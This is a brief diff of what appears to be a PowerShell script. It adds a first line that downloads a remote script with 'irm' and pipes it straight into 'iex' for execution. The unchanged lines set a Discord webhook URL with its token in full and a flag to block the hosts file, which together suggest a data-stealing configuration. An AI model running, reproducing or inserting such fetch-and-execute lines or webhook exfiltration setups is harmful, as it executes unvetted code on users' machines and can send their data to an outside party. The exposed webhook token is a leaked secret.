@@ -1,3 +1,4 @@
+irm "https://github.com/ChrisTitusTech/winutil/releases/download/RELEASE_TAG/winutil.ps1" | iex
 $webhook = "https://discord.com/api/webhooks/1251938579307958403/Qaxju-CGPMJ7ngRoCZbnsq20FIYrfWIZUcZf2I9DYgG3yuClI3GGpTEv0T1DBceXNwFx" 
 $debug = $true
 $blockhostsfile = $true
